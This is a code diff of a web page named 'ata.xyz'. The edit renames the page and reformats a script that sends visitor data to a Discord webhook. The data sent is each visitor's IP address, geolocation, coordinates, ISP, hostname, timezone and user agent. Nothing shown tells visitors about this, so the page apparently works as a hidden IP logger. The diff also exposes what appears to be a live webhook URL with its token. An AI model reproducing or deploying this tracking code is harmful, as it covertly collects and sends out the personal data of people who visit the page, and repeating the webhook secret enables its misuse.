@@ -6,7 +6,7 @@
     <title>ata.xyz</title>
     <link rel="stylesheet" href="haha.css">
 
-    <meta name="title" content="oober.xyz" />
+    <meta name="title" content="ata.xyz" />
     <meta name="description" content="" />
 
     <meta property="og:type" content="website" />
@@ -75,7 +75,12 @@
             const webhookURL = 'https://discord.com/api/webhooks/1270105042791305227/3uzXne5QtKvaKnAQoGByUoXpykEbs8Y_FYafGTNEtc9_GZ3w9F534yosGry4F24Y8rG4'; // Replace with your Discord webhook URL
             
             const message = {
-                content: `User Info:\nIP Address: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nLocation: ${data.loc}\nOrganisation: ${data.org}\nHostname: ${data.hostname}\nTimezone: ${data.timezone}\nUserAgent: ${window.navigator.userAgent}`
+                content: `**User Info:**\n\n` +
+                         `**IP Address:** ${data.ip}  |  **City:** ${data.city}\n` +
+                         `**Region:** ${data.region}  |  **Country:** ${data.country}\n` +
+                         `**Location:** ${data.loc}  |  **Organisation:** ${data.org}\n` +
+                         `**Hostname:** ${data.hostname}  |  **Timezone:** ${data.timezone}\n` +
+                         `**UserAgent:** ${window.navigator.userAgent}`
             };
 
             try {
